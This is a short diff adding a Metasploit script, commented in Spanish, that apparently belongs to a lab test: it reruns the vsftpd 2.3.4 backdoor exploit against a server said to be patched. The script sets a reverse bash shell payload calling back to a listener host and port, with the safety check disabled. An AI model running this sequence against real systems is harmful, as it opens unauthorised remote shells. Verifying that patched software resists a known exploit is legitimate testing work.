@@ -1,0 +1,11 @@
+# El MISMO ataque, ahora contra el servidor ACTUALIZADO (vsftpd 3.0.5, sin backdoor).
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.13.37.20
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 10.13.37.10
+set LPORT 4444
+set AutoCheck false
+run
+
+# Salimos de Metasploit
+exit -y
